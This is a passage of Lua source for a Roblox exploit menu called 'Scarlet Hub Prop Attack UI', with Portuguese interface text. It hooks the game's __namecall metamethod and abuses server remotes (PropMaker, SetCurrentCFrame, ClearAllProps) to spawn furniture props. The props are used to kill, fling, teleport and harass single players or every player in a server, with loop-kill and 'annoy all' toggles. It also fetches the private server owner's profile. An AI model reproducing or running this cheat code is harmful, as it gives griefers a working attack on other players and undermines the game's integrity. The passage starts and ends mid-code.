				if getnamecallmethod() ~= "GetMouse" or p22 ~= LocalPlayer2 or not LocalPlayer2.Character then
					return getgenv().old__namecall(p22, ...)
				end

				local v234 = getgenv().old__namecall(p22, ...)
				local LocalPlayer3 = game:GetService("Players").LocalPlayer

				return {
					Hit = (LocalPlayer3.Character or LocalPlayer3.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart").CFrame + Vector3.new(0, -10, 0),
					Target = v234.Target
				}
			end, "...environment.__check.__Scarlethub.__metamethosa")

			local LocalPlayer3 = Players3.LocalPlayer
			local u237

			local function v238()
				if getgenv().viewDiedConn then
					getgenv().viewDiedConn:Disconnect()
					getgenv().viewDiedConn = nil
				end

				if getgenv().viewChangedConn then
					getgenv().viewChangedConn:Disconnect()
					getgenv().viewChangedConn = nil
				end

				getgenv().viewingPlayer = nil

				if LocalPlayer3.Character then
					local Humanoid2 = LocalPlayer3.Character:FindFirstChildOfClass("Humanoid")

					if Humanoid2 then
						workspace.CurrentCamera.CameraSubject = Humanoid2
					end
				end
			end
			local function v240(p23)
				if p23 then
					if p23:IsA("Player") then
						v238()
						getgenv().viewingPlayer = p23

						local function v241()
							if getgenv().viewingPlayer and getgenv().viewingPlayer.Character then
								if viewingPlayer.Character:FindFirstChildOfClass("Humanoid") then
									workspace.CurrentCamera.CameraSubject = viewingPlayer.Character:FindFirstChildOfClass("Humanoid")
								end
							end
						end

						v241()
						getgenv().viewDiedConn = p23.CharacterAdded:Connect(function()
							while true do
								task.wait()

								if not p23.Character then
									continue
								end

								if p23.Character:FindFirstChildOfClass("Humanoid") then
									break
								end
							end

							v241()
						end)
						getgenv().viewChangedConn = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
							if getgenv().viewingPlayer then
								v241()
							end
						end)

						return
					end
				end
			end
			local function v242()
				local PropMaker = Players3.LocalPlayer.Backpack:FindFirstChild("PropMaker") or Players3.LocalPlayer.Character and Players3.LocalPlayer.Character:FindFirstChild("PropMaker")

				if not PropMaker then
					ReplicatedStorage2.RE["1Too1l"]:InvokeServer("PickingTools", "PropMaker")
					task.wait()
					PropMaker = Players3.LocalPlayer.Backpack:FindFirstChild("PropMaker") or Players3.LocalPlayer.Character and Players3.LocalPlayer.Character:FindFirstChild("PropMaker")
				end

				if PropMaker and PropMaker.Parent ~= LocalPlayer3.Character then
					PropMaker.Parent = Players3.LocalPlayer.Character
				end

				return PropMaker
			end
			local function v244(p24)
				ReplicatedStorage2.RE["1Clea1rTool1s"]:FireServer("RequestingPropName", p24, "Furniture")

				local u245
				local connection

				connection = workspace.WorkspaceCom["001_TrafficCones"].ChildAdded:Connect(function(child)
					if child:GetAttribute("id") == p24 then
						u245 = child
						connection:Disconnect()
					end
				end)

				local now = tick()

				while true do
					task.wait()

					if u245 then
						break
					elseif tick() - now > 4 then
						break
					end
				end

				return u245
			end
			local function v248(p25, p26, p27, p28, p29, p30)
				local SetCurrentCFrame = p25:WaitForChild("SetCurrentCFrame", 5)

				if not SetCurrentCFrame then
					return false
				end

				local Humanoid2 = p26.Character:FindFirstChildWhichIsA("Humanoid")
				local HumanoidRootPart2 = p26.Character:FindFirstChild("HumanoidRootPart")

				if not Humanoid2 or not HumanoidRootPart2 then
					return false
				end

				local now = tick()

				while p26.Parent and Humanoid2.Parent and Humanoid2.Health > 0 and not Humanoid2.Sit and tick() - now < 10 do
					local v253 = HumanoidRootPart2.Velocity / 4
					local v254 = -3.3 + math.sin(tick() * 45) * 2.5
					local Head = p26.Character:FindFirstChild("Head")
					local v256 = (Head and Head.CFrame or HumanoidRootPart2.CFrame) * CFrame.new(0, v254, 0) + v253

					pcall(function()
						task.spawn(function()
							return SetCurrentCFrame:InvokeServer(v256)
						end)
					end)
					task.wait()
				end

				if not p29 and Humanoid2.Sit then
					pcall(function()
						if p28 then
							return
						end

						local Character2

						if p27 then
							local LocalPlayer4 = game:GetService("Players").LocalPlayer

							Character2 = LocalPlayer4.Character or LocalPlayer4.CharacterAdded:Wait()
						end

						SetCurrentCFrame:InvokeServer(p30 and CFrame.new(9e9, 9e9, 9e9) or p27 and Character2:WaitForChild("HumanoidRootPart").CFrame or CFrame.new(-800, -499, 450))
					end)
					task.wait()
				end

				return true
			end
			local function v259(p31)
				pcall(function()
					return p31.DeleteProp:InvokeServer()
				end)

				return true
			end
			local function v260()
				local t15 = {}

				for _, player in ipairs(Players3:GetPlayers()) do
					if player ~= Players3.LocalPlayer then
						table.insert(t15, player.Name)
					end
				end

				return t15
			end

			task.spawn(function()
				while task.wait(1) do
					if getgenv().AnnoyAllToggle then
						for _, player in pairs(Players3:GetPlayers()) do
							if player ~= LocalPlayer2 then
								if getgenv().AnnoyAllToggle then
									if player.Character then
										if player.Character:FindFirstChild("Humanoid") then
											if player.Character.Humanoid.Health > 0 then
												task.spawn(function()
													local v266 = v242()

													if v266 then
														v266:Activate()

														local FurnitureBleachers = v244("FurnitureBleachers")

														if FurnitureBleachers then
															v248(FurnitureBleachers, player, "Annoy", "AnnoyAllToggle")
														end
													end
												end)
												task.wait(0.2)
											end
										end
									end
								end
							end
						end
					end
				end
			end)
			task.spawn(function()
				while task.wait(0.5) do
					if getgenv().AnnoyToggle then
						if u237 then
							if u237.Character then
								if u237.Character:FindFirstChild("Humanoid") and u237.Character.Humanoid.Health > 0 then
									local v268 = v242()

									if v268 then
										v268:Activate()

										local FurnitureBleachers = v244("FurnitureBleachers")

										if FurnitureBleachers then
											v248(FurnitureBleachers, u237, nil, nil, true)
										end
									end
								end
							end
						end
					end
				end
			end)

			local v270 = lib2:MakeWindow({
				Name = "Scarlet Hub Prop Attack UI",
				HidePremium = false,
				SaveConfig = false,
				ConfigFolder = "PropAttack",
				IntroText = "Welcome, " .. (AuthenticatedUser or "Chaos Hub User")
			})
			local v271 = v270:MakeTab({
				Name = "Main",
				Icon = "rbxassetid://4483345998",
				PremiumOnly = false
			})
			local v272 = v271:AddSection({
				Name = "Single Target"
			})
			local u273 = v260()
			local v274 = v272:AddDropdown({
				Name = "Select Player",
				Default = u273[1] or "Nenhum",
				Options = u273,
				Callback = function(p32)
					u237 = Players3:FindFirstChild(p32)
				end
			})

			Players3.PlayerAdded:Connect(function()
				u273 = v260()

				return v274:Refresh(u273, true)
			end)
			Players3.PlayerRemoving:Connect(function()
				u273 = v260()

				return v274:Refresh(u273, true)
			end)
			v272:AddButton({
				Name = "Kill Selected",
				Callback = function()
					if not u237 or not u237.Character then
						lib2:MakeNotification({
							Name = "Erro",
							Content = "Jogador não selecionado ou sem character",
							Time = 4
						})

						return
					end

					local v275 = u237
					local v276 = v242()

					if not v276 then
						return
					end

					task.spawn(function()
						v276:Activate()
					end)

					local FurnitureBleachers = v244("FurnitureBleachers")

					if not FurnitureBleachers then
						return
					end

					v248(FurnitureBleachers, v275)
					task.spawn(v259, FurnitureBleachers)
				end
			})
			v272:AddButton({
				Name = "Fling Selected",
				Callback = function()
					if not u237 or not u237.Character then
						lib2:MakeNotification({
							Name = "Erro",
							Content = "Jogador não selecionado ou sem character",
							Time = 4
						})

						return
					end

					local v278 = u237
					local v279 = v242()

					if not v279 then
						return
					end

					task.spawn(function()
						v279:Activate()
					end)

					local FurnitureBleachers = v244("FurnitureBleachers")

					if not FurnitureBleachers then
						return
					end

					v248(FurnitureBleachers, v278, nil, nil, nil, true)
					task.spawn(v259, FurnitureBleachers)
				end
			})
			v272:AddButton({
				Name = "Bring Selected",
				Callback = function()
					if not u237 or not u237.Character then
						lib2:MakeNotification({
							Name = "Erro",
							Content = "Jogador não selecionado ou sem character",
							Time = 4
						})

						return
					end

					local v281 = u237
					local v282 = v242()

					if not v282 then
						return
					end

					task.spawn(function()
						v282:Activate()
					end)

					local FurnitureBleachers = v244("FurnitureBleachers")

					if not FurnitureBleachers then
						return
					end

					v248(FurnitureBleachers, v281, true)
					task.spawn(v259, FurnitureBleachers)
				end
			})
			getgenv().LoopKillEnabled = false
			v272:AddToggle({
				Name = "Loop Kill Selected",
				Default = false,
				Callback = function(p33)
					getgenv().LoopKillEnabled = p33

					if p33 then
						if not u237 or not u237.Parent then
							getgenv().LoopKillEnabled = false
							lib2:MakeNotification({
								Name = "Aviso",
								Content = "Loop Kill parado: Jogador saiu ou inválido.",
								Time = 3
							})

							return
						end

						local function v284()
							if not LoopKillEnabled then
								return
							end

							ReplicatedStorage2.RE["1Too1l"]:InvokeServer("PickingTools", "PropMaker")
							task.wait()

							local v285 = v242()

							if v285 then
								v285:Activate()

								local FurnitureBleachers = v244("FurnitureBleachers")

								if FurnitureBleachers then
									v248(FurnitureBleachers, u237)
									task.spawn(v259, FurnitureBleachers)
								end
							end

							task.wait()
						end

						if u237.Character then
							if u237.Character:FindFirstChild("Humanoid") and u237.Character.Humanoid.Health > 0 then
								v284()
							end
						end

						getgenv().charAddedConn = u237.CharacterAdded:Connect(function(character)
							character:WaitForChild("Humanoid")
							v284()
						end)
					elseif getgenv().charAddedConn then
						getgenv().charAddedConn:Disconnect()
						getgenv().charAddedConn = nil
					end
				end
			})
			v272:AddToggle({
				Name = "Annoy Selected",
				Default = false,
				Callback = function(p34)
					getgenv().AnnoyToggle = p34
				end
			})
			v272:AddToggle({
				Name = "View Player",
				Default = false,
				Callback = function(p35)
					if p35 then
						if not u237 then
							warn("Nenhum player selecionado")

							return
						end

						v240(u237)
					else
						v238()
					end
				end
			})

			local v287 = v271:AddSection({
				Name = "Multiple Targets (ALL)"
			})

			pcall(function()
				v287:AddParagraph("ATENCAO [WARNING]", "Se algum dos metodos all (com excecao do annoy) ficar muito tempo sem spawnar um prop novo, peco que clique na tela para spawnar o prop e reconsertar o loop.")
				v287:AddParagraph("ATENCAO [WARNING]", "Ficar parado evita bugs de rate limit do prop (com excecao do annoy).")
			end)
			v287:AddButton({
				Name = "Kill All",
				Callback = function()
					local v288 = v232 and 30 or 10

					local function v289()
						return LocalPlayer2.Backpack:FindFirstChild("PropMaker") or LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("PropMaker")
					end

					local v290 = v289()

					if not v290 then
						ReplicatedStorage2.RE["1Too1l"]:InvokeServer("PickingTools", "PropMaker")
						task.wait()
						v290 = v289()
					end

					if not v290 then
						return
					end

					v290.Parent = LocalPlayer2.Character

					local t16 = {}

					for _, player in ipairs(Players3:GetPlayers()) do
						if player ~= LocalPlayer2 and player.Character then
							local Humanoid2 = player.Character:FindFirstChildWhichIsA("Humanoid")
							local HumanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")

							if Humanoid2 then
								if HumanoidRootPart2 and Humanoid2.Health > 0 and not Humanoid2.Sit then
									table.insert(t16, player)
								end
							end
						end
					end

					local n6 = 1

					while n6 <= #t16 do
						local t17 = {}

						for i = 1, v288 do
							if t16[n6] then
								table.insert(t17, t16[n6])
								n6 += 1
							end
						end

						local t18 = {}
						local connection = workspace.WorkspaceCom["001_TrafficCones"].ChildAdded:Connect(function(child)
							if child:GetAttribute("id") == "FurnitureBleachers" and child.Name == "Prop" .. LocalPlayer2.Name then
								table.insert(t18, child)
								lib2:MakeNotification({
									Name = "Aviso",
									Content = "Spawned: " .. #t18,
									Time = 2
								})
							end
						end)

						game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack({ "ClearAllProps" }))

						for i = 1, #t17 do
							local v302 = #t18

							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "Furniture",
								itemType = "Props"
							})
							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "FurnitureBleachers",
								itemType = "Props"
							})
							ReplicatedStorage2.RE["1Clea1rTool1s"]:FireServer("RequestingPropName", "FurnitureBleachers", "Furniture")

							local now = tick()

							v290:Activate()

							local v304 = false

							repeat
								task.wait()

								if not v304 and #t18 == v302 and tick() - now >= 1.5 then
									v304 = true
									game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("Props"):FireServer(unpack({ "PropOnPropOn" }))
									task.wait()
									v290.Parent = LocalPlayer2.Backpack
									task.wait()
									v290.Parent = LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()
									task.wait()
									v290:Activate()
								end
							until #t18 == v302 + 1

							task.wait(1)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os props ja foram spawnados: " .. #t18,
							Time = 2
						})

						local now = tick()

						while #t18 < #t17 and tick() - now < 5 do
							task.wait()
						end

						if connection then
							connection:Disconnect()
						end

						for _, v1 in ipairs(t17) do
							local v308 = table.remove(t18, 1)

							task.spawn(function()
								if v308 and v1.Character then
									local Humanoid2 = v1.Character:FindFirstChildWhichIsA("Humanoid")
									local HumanoidRootPart2 = v1.Character:FindFirstChild("HumanoidRootPart")
									local SetCurrentCFrame = v308:WaitForChild("SetCurrentCFrame", 5)

									if Humanoid2 and HumanoidRootPart2 and SetCurrentCFrame then
										local now2 = tick()

										while Humanoid2.Health > 0 and not Humanoid2.Sit and tick() - now2 < 10 do
											local Head = v1.Character:FindFirstChild("Head")
											local v314 = HumanoidRootPart2.Velocity * 0.33

											pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, (Head and Head.CFrame or HumanoidRootPart2.CFrame) * CFrame.new(0, -3.3 + math.sin(tick() * 45) * 2.5, 0) + v314)
											task.wait()
										end

										if Humanoid2.Sit then
											pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, CFrame.new(-800, -300, 450))
											task.wait(0.2)
										end
									end

									task.spawn(function()
										pcall(function()
											v308.DeleteProp:InvokeServer()
										end)
									end)
								end
							end)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os players ja foram processados!",
							Time = 2
						})
						task.wait(0.4)
					end
				end
			})
			v287:AddButton({
				Name = "Bring All",
				Callback = function()
					local v315 = v232 and 30 or 10

					local function v316()
						return LocalPlayer2.Backpack:FindFirstChild("PropMaker") or LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("PropMaker")
					end

					local v317 = v316()

					if not v317 then
						ReplicatedStorage2.RE["1Too1l"]:InvokeServer("PickingTools", "PropMaker")
						task.wait()
						v317 = v316()
					end

					if not v317 then
						return
					end

					v317.Parent = LocalPlayer2.Character

					local t19 = {}

					for _, player in ipairs(Players3:GetPlayers()) do
						if player ~= LocalPlayer2 and player.Character then
							local Humanoid2 = player.Character:FindFirstChildWhichIsA("Humanoid")
							local HumanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")

							if Humanoid2 and HumanoidRootPart2 then
								if Humanoid2.Health > 0 and not Humanoid2.Sit then
									table.insert(t19, player)
								end
							end
						end
					end

					local n7 = 1

					game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack({ "ClearAllProps" }))

					while n7 <= #t19 do
						local t20 = {}

						for i = 1, v315 do
							if t19[n7] then
								table.insert(t20, t19[n7])
								n7 += 1
							end
						end

						local t21 = {}
						local connection = workspace.WorkspaceCom["001_TrafficCones"].ChildAdded:Connect(function(child)
							if child:GetAttribute("id") == "FurnitureBleachers" and child.Name == "Prop" .. LocalPlayer2.Name then
								table.insert(t21, child)
								lib2:MakeNotification({
									Name = "Aviso",
									Content = "Spawned: " .. #t21,
									Time = 2
								})
							end
						end)

						for i = 1, #t20 do
							local v329 = #t21

							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "Furniture",
								itemType = "Props"
							})
							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "FurnitureBleachers",
								itemType = "Props"
							})
							ReplicatedStorage2.RE["1Clea1rTool1s"]:FireServer("RequestingPropName", "FurnitureBleachers", "Furniture")

							local now = tick()

							v317:Activate()

							local v331 = false

							repeat
								task.wait()

								if not v331 and #t21 == v329 and tick() - now >= 1.5 then
									v331 = true
									game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("Props"):FireServer(unpack({ "PropOnPropOn" }))
									task.wait()
									v317.Parent = LocalPlayer2.Backpack
									task.wait()
									v317.Parent = LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()
									task.wait()
									v317:Activate()
								end
							until #t21 == v329 + 1

							task.wait(1)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os props ja foram spawnados: " .. #t21,
							Time = 2
						})

						local now = tick()

						while #t21 < #t20 and tick() - now < 5 do
							task.wait()
						end

						if connection then
							connection:Disconnect()
						end

						for _, v1 in ipairs(t20) do
							local v335 = table.remove(t21, 1)

							task.spawn(function()
								if v335 then
									if v1.Character then
										local Humanoid2 = v1.Character:FindFirstChildWhichIsA("Humanoid")
										local HumanoidRootPart2 = v1.Character:FindFirstChild("HumanoidRootPart")
										local SetCurrentCFrame = v335:WaitForChild("SetCurrentCFrame", 5)

										if Humanoid2 and HumanoidRootPart2 and SetCurrentCFrame then
											local now2 = tick()

											while Humanoid2.Health > 0 and not Humanoid2.Sit and tick() - now2 < 10 do
												local Head = v1.Character:FindFirstChild("Head")
												local v341 = HumanoidRootPart2.Velocity * 0.33

												pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, (Head and Head.CFrame or HumanoidRootPart2.CFrame) * CFrame.new(0, -3.3 + math.sin(tick() * 45) * 2.5, 0) + v341)
												task.wait()
											end

											if Humanoid2.Sit then
												pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, (LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart").CFrame)
												task.wait(0.2)
											end
										end

										task.spawn(function()
											pcall(function()
												v335.DeleteProp:InvokeServer()
											end)
										end)
									end
								end
							end)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os players ja foram processados!",
							Time = 2
						})
						task.wait(0.4)
					end
				end
			})
			v287:AddButton({
				Name = "Fling All",
				Callback = function()
					local v342 = v232 and 30 or 10

					local function v343()
						return LocalPlayer2.Backpack:FindFirstChild("PropMaker") or LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("PropMaker")
					end

					local v344 = v343()

					if not v344 then
						ReplicatedStorage2.RE["1Too1l"]:InvokeServer("PickingTools", "PropMaker")
						task.wait()
						v344 = v343()
					end

					if not v344 then
						return
					end

					v344.Parent = LocalPlayer2.Character

					local t22 = {}

					for _, player in ipairs(Players3:GetPlayers()) do
						if player ~= LocalPlayer2 and player.Character then
							local Humanoid2 = player.Character:FindFirstChildWhichIsA("Humanoid")
							local HumanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")

							if Humanoid2 and HumanoidRootPart2 and Humanoid2.Health > 0 and not Humanoid2.Sit then
								table.insert(t22, player)
							end
						end
					end

					local n8 = 1

					game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack({ "ClearAllProps" }))

					while n8 <= #t22 do
						local t23 = {}

						for i = 1, v342 do
							if t22[n8] then
								table.insert(t23, t22[n8])
								n8 += 1
							end
						end

						local t24 = {}
						local connection = workspace.WorkspaceCom["001_TrafficCones"].ChildAdded:Connect(function(child)
							if child:GetAttribute("id") == "FurnitureBleachers" then
								if child.Name == "Prop" .. LocalPlayer2.Name then
									table.insert(t24, child)
									lib2:MakeNotification({
										Name = "Aviso",
										Content = "Spawned: " .. #t24,
										Time = 2
									})
								end
							end
						end)

						for i = 1, #t23 do
							local v356 = #t24

							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "Furniture",
								itemType = "Props"
							})
							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "FurnitureBleachers",
								itemType = "Props"
							})
							ReplicatedStorage2.RE["1Clea1rTool1s"]:FireServer("RequestingPropName", "FurnitureBleachers", "Furniture")

							local now = tick()

							v344:Activate()

							local v358 = false

							repeat
								task.wait()

								if not v358 and #t24 == v356 and tick() - now >= 1.5 then
									v358 = true
									game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("Props"):FireServer(unpack({ "PropOnPropOn" }))
									task.wait()
									v344.Parent = LocalPlayer2.Backpack
									task.wait()
									v344.Parent = LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()
									task.wait()
									v344:Activate()
								end
							until #t24 == v356 + 1

							task.wait(1)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os props ja foram spawnados: " .. #t24,
							Time = 2
						})

						local now = tick()

						while #t24 < #t23 and tick() - now < 5 do
							task.wait()
						end

						if connection then
							connection:Disconnect()
						end

						for _, v1 in ipairs(t23) do
							local v362 = table.remove(t24, 1)

							task.spawn(function()
								if v362 and v1.Character then
									local Humanoid2 = v1.Character:FindFirstChildWhichIsA("Humanoid")
									local HumanoidRootPart2 = v1.Character:FindFirstChild("HumanoidRootPart")
									local SetCurrentCFrame = v362:WaitForChild("SetCurrentCFrame", 5)

									if Humanoid2 and HumanoidRootPart2 and SetCurrentCFrame then
										local now2 = tick()

										if Humanoid2.Health > 0 and not Humanoid2.Sit and tick() - now2 < 10 then
											repeat
												local Head = v1.Character:FindFirstChild("Head")
												local v368 = HumanoidRootPart2.Velocity * 0.33

												pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, (Head and Head.CFrame or HumanoidRootPart2.CFrame) * CFrame.new(0, -3.3 + math.sin(tick() * 45) * 2.5, 0) + v368)
												task.wait()
											until not (Humanoid2.Health > 0) or Humanoid2.Sit or not (tick() - now2 < 10)

											if Humanoid2.Sit then
												if not LocalPlayer2.Character then
													LocalPlayer2.CharacterAdded:Wait()
												end

												pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, CFrame.new(9e9, 9e9, 9e9))
												task.wait(0.2)
											end
										elseif Humanoid2.Sit then
											if not LocalPlayer2.Character then
												LocalPlayer2.CharacterAdded:Wait()
											end

											pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, CFrame.new(9e9, 9e9, 9e9))
											task.wait(0.2)
										end
									end

									task.spawn(function()
										pcall(function()
											v362.DeleteProp:InvokeServer()
										end)
									end)
								end
							end)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os players ja foram processados!",
							Time = 2
						})
						task.wait(0.4)
					end
				end
			})
			v287:AddToggle({
				Name = "Annoy all",
				Default = false,
				Callback = function(p36)
					getgenv().AnnoyAllToggle = p36
				end
			})

			local v369 = v270:MakeTab({
				Name = "Bring (to the selected player)",
				Icon = "rbxassetid://4483345998",
				PremiumOnly = false
			})
			local v370 = v369:AddSection({
				Name = "Single Target Bring"
			})
			local u371 = v260()
			local v372 = v370:AddDropdown({
				Name = "Select Player to Bring",
				Default = u371[1] or "Nenhum",
				Options = u371,
				Callback = function(p37)
					selectedVictim = Players3:FindFirstChild(p37)
				end
			})
			local v373 = v370:AddDropdown({
				Name = "Select Target Player",
				Default = u371[1] or "Nenhum",
				Options = u371,
				Callback = function(p38)
					selectedTarget = Players3:FindFirstChild(p38)
				end
			})

			Players3.PlayerAdded:Connect(function()
				u371 = v260()
				v372:Refresh(u371, true)
				v373:Refresh(u371, true)
			end)
			Players3.PlayerRemoving:Connect(function()
				u371 = v260()
				v372:Refresh(u371, true)
				v373:Refresh(u371, true)
			end)
			v370:AddButton({
				Name = "Bring Selected to Target",
				Callback = function()
					if selectedVictim and selectedVictim.Character then
						if selectedTarget and selectedTarget.Character then
							if selectedVictim == selectedTarget then
								lib2:MakeNotification({
									Name = "Erro",
									Content = "Selecione jogadores diferentes",
									Time = 4
								})

								return
							end

							local selectedVictim_ = selectedVictim
							local v375 = v242()

							if not v375 then
								return
							end

							task.spawn(function()
								v375:Activate()
							end)

							local FurnitureBleachers = v244("FurnitureBleachers")

							if not FurnitureBleachers then
								return
							end

							v248(FurnitureBleachers, selectedVictim_, true, true)

							local SetCurrentCFrame = FurnitureBleachers:WaitForChild("SetCurrentCFrame", 5)

							if SetCurrentCFrame then
								pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, (selectedTarget.Character or selectedTarget.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart").CFrame)
								task.wait(0.2)
							end

							task.spawn(v259, FurnitureBleachers)

							return
						end
					end

					lib2:MakeNotification({
						Name = "Erro",
						Content = "Jogadores não selecionados ou sem character",
						Time = 4
					})
				end
			})

			local u378
			local v379 = v369:AddDropdown({
				Name = "Select Player",
				Default = u371[1] or "Nenhum",
				Options = u371,
				Callback = function(p39)
					u378 = Players3:FindFirstChild(p39)
				end
			})

			Players3.PlayerAdded:Connect(function()
				u371 = v260()

				return v379:Refresh(u371, true)
			end)
			Players3.PlayerRemoving:Connect(function()
				u371 = v260()

				return v379:Refresh(u371, true)
			end)
			v369:AddButton({
				Name = "Bring all to the selected player",
				Callback = function()
					if not u378 then
						return
					end

					local v380 = v232 and 30 or 10

					local function v381()
						return LocalPlayer2.Backpack:FindFirstChild("PropMaker") or LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("PropMaker")
					end

					local v382 = v381()

					if not v382 then
						ReplicatedStorage2.RE["1Too1l"]:InvokeServer("PickingTools", "PropMaker")
						task.wait()
						v382 = v381()
					end

					if not v382 then
						return
					end

					v382.Parent = LocalPlayer2.Character

					local t25 = {}

					for _, player in ipairs(Players3:GetPlayers()) do
						if player ~= u378 and player.Character then
							local Humanoid2 = player.Character:FindFirstChildWhichIsA("Humanoid")
							local HumanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")

							if Humanoid2 and HumanoidRootPart2 and Humanoid2.Health > 0 and not Humanoid2.Sit then
								table.insert(t25, player)
							end
						end
					end

					local n9 = 1

					while n9 <= #t25 do
						local t26 = {}

						for i = 1, v380 do
							if t25[n9] then
								table.insert(t26, t25[n9])
								n9 += 1
							end
						end

						local t27 = {}
						local connection = workspace.WorkspaceCom["001_TrafficCones"].ChildAdded:Connect(function(child)
							if child:GetAttribute("id") == "FurnitureBleachers" and child.Name == "Prop" .. LocalPlayer2.Name then
								table.insert(t27, child)
								lib2:MakeNotification({
									Name = "Aviso",
									Content = "Spawned: " .. #t27,
									Time = 2
								})
							end
						end)

						for i = 1, #t26 do
							local v394 = #t27

							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "Furniture",
								itemType = "Props"
							})
							ReplicatedStorage2.Remotes.TelemetryClientInteraction:FireServer("filterClick", {
								name = "FurnitureBleachers",
								itemType = "Props"
							})
							ReplicatedStorage2.RE["1Clea1rTool1s"]:FireServer("RequestingPropName", "FurnitureBleachers", "Furniture")

							local now = tick()

							v382:Activate()

							local v396 = false

							repeat
								task.wait()

								if not v396 and #t27 == v394 and tick() - now >= 1.5 then
									v396 = true
									game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("Props"):FireServer(unpack({ "PropOnPropOn" }))
									task.wait()
									v382.Parent = LocalPlayer2.Backpack
									task.wait()
									v382.Parent = LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()
									task.wait()
									v382:Activate(0.1)
								end
							until #t27 == v394 + 1

							task.wait(1)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os props ja foram spawnados: " .. #t27,
							Time = 2
						})

						local now = tick()

						while #t27 < #t26 and tick() - now < 5 do
							task.wait()
						end

						if connection then
							connection:Disconnect()
						end

						for _, v1 in ipairs(t26) do
							local v400 = table.remove(t27, 1)

							task.spawn(function()
								if v400 and v1.Character then
									local Humanoid2 = v1.Character:FindFirstChildWhichIsA("Humanoid")
									local HumanoidRootPart2 = v1.Character:FindFirstChild("HumanoidRootPart")
									local SetCurrentCFrame = v400:WaitForChild("SetCurrentCFrame", 5)

									if Humanoid2 and HumanoidRootPart2 and SetCurrentCFrame then
										local now2 = tick()

										while Humanoid2.Health > 0 and not Humanoid2.Sit and tick() - now2 < 10 do
											local Head = v1.Character:FindFirstChild("Head")
											local v406 = HumanoidRootPart2.Velocity * 0.33

											pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, (Head and Head.CFrame or HumanoidRootPart2.CFrame) * CFrame.new(0, -3.33, 0) + v406)
											task.wait(0.05)
										end

										if Humanoid2.Sit then
											pcall(SetCurrentCFrame.InvokeServer, SetCurrentCFrame, (u378.Character or u378.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart").CFrame)
											task.wait(0.2)
										end
									end

									task.spawn(function()
										pcall(function()
											v400.DeleteProp:InvokeServer()
										end)
									end)
								end
							end)
						end

						lib2:MakeNotification({
							Name = "Aviso",
							Content = "Todos os players ja foram mortos!",
							Time = 2
						})
						task.wait(0.4)
					end
				end
			})

			local v407 = utf8.char(128994)
			local v408 = utf8.char(128308)
			local v409 = v270:MakeTab({
				Name = "Server Info",
				Icon = "rbxassetid://4483345998",
				PremiumOnly = false
			})

			v409:AddParagraph("Is private server:", v232 and v407 or v408)

			local v410 = v409:AddParagraph("Is owner in server:", v408)

			getgenv().IsPrivateServerConn = game:GetService("RunService").Heartbeat:Connect(function()
				local v411 = false

				for _, player in pairs(Players3:GetPlayers()) do
					if player.UserId == response then
						v411 = true
					end
				end

				v410:Set(v411 and v407 or v408)
			end)

			if v232 then
				local v414 = v270:MakeTab({
					Name = "Server Owner info",
					Icon = "rbxassetid://4483345998",
					PremiumOnly = false
				})
				local data = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/" .. response))

				v414:AddParagraph("Username", data.name or "unknown")
				v414:AddParagraph("Display name", data.displayName or "unknown")
				v414:AddParagraph("Bio", data.description or "no bio")
			end

			lib2:Init()
		end
	})
	v126:AddSection({
		Name = "Couch"
	})
	v126:AddButton({
		Name = "Kill Player",
		Callback = v139
	})
	v126:AddButton({
		Name = "Puxar Player",
		Callback = v156
	})

	local function v416(p40)
		local Players3 = setmetatable({}, {
			__index = function(p41, p42)
